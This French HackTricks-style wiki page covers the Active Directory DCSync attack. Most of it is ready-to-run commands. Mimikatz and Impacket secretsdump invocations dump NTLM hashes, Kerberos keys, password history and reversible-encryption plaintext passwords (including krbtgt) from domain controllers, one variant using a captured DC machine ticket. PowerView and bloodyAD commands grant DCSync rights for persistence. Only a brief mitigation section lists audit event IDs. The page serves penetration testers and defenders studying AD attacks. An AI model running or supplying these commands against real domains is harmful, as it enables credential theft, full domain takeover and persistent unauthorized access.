# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

La permission **DCSync** implique d’avoir ces permissions sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.

**Notes importantes sur DCSync :**

- L’attaque **DCSync simule le comportement d’un Domain Controller et demande à d’autres Domain Controllers de répliquer des informations** en utilisant le Directory Replication Service Remote Protocol (MS-DRSR). Comme MS-DRSR est une fonction valide et nécessaire d’Active Directory, il ne peut pas être désactivé.
- Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrators, et Domain Controllers** ont les privilèges requis.
- En pratique, un **DCSync complet** a besoin de **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** sur le domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` est souvent délégué avec eux, mais seul il est plus pertinent pour synchroniser des attributs **confidential / RODC-filtered** (par exemple des secrets de type legacy LAPS) que pour un dump complet de krbtgt.
- Si des mots de passe de comptes sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour renvoyer le mot de passe en clair

### Enumeration

Vérifiez qui possède ces permissions à l’aide de `powerview` :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Si vous voulez vous concentrer sur les **principals non par défaut** avec des droits DCSync, excluez les groupes intégrés capables de réplication et examinez uniquement les trustees inattendus :
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploiter localement
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiter à distance
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Exemples pratiques ciblés :
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync en utilisant un TGT de machine DC capturé (ccache)

Dans des scénarios d'export-mode avec unconstrained-delegation, vous pouvez capturer un TGT de machine de Domain Controller (par exemple, `DC1$@DOMAIN` pour `krbtgt@DOMAIN`). Vous pouvez ensuite utiliser ce ccache pour vous authentifier en tant que DC et effectuer un DCSync sans mot de passe.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes opérationnelles :

- **Le chemin Kerberos d'Impacket touche SMB en premier** avant l'appel DRSUAPI. Si l'environnement impose la **validation du nom cible SPN**, un dump complet peut échouer avec `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Dans ce cas, demandez d'abord un ticket de service **`cifs/<dc>`** pour le DC cible, ou basculez vers **`-just-dc-user`** pour le compte dont vous avez besoin immédiatement.
- Quand vous n'avez que des droits de réplication limités, la synchronisation de type LDAP/DirSync peut encore exposer des attributs **confidential** ou **RODC-filtered** (par exemple l'ancien `ms-Mcs-AdmPwd`) sans réplication complète de `krbtgt`.

`-just-dc` génère 3 fichiers :

- un avec les **hashes NTLM**
- un avec les **clés Kerberos**
- un avec les mots de passe en clair depuis le NTDS pour tout compte configuré avec le chiffrement [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) activé. Vous pouvez obtenir les utilisateurs avec reversible encryption avec

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistance

Si vous êtes domain admin, vous pouvez accorder ces permissions à n'importe quel utilisateur avec l'aide de `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Les opérateurs Linux peuvent faire la même chose avec `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Ensuite, vous pouvez **vérifier si l'utilisateur a bien reçu** les 3 privilèges en les recherchant dans la sortie de (vous devriez pouvoir voir les noms des privilèges dans le champ "ObjectType") :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
